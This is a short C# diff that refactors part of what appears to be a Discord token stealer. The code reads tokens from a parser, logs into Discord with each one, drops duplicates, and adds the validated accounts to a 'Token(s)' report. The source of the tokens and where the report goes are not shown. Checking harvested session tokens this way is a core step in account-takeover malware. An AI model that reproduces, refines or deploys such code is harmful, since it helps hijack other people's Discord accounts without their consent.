@@ -13,22 +13,20 @@ content.AppendLine("Token(s): ");
 var semaphore = new SemaphoreSlim(1, 1);
 var loggedUsers = new ConcurrentBag<string>();
 
-using (var discordClient = new DiscordClient())
+using var discordClient = new DiscordClient();
+await foreach (var token in TokenParser.ParseAsync())
 {
-    await foreach (var token in TokenParser.ParseAsync())
+    await semaphore.WaitAsync();
+    try
     {
-        await semaphore.WaitAsync();
-        try
-        {
-            if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id)) 
-                continue;
-            content.Append(discordUser);
-            loggedUsers.Add(discordUser.Id);
-        }
-        finally
-        {
-            semaphore.Release();
-        }
+        if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id)) 
+            continue;
+        content.Append(discordUser);
+        loggedUsers.Add(discordUser.Id);
+    }
+    finally
+    {
+        semaphore.Release();
     }
 }
 
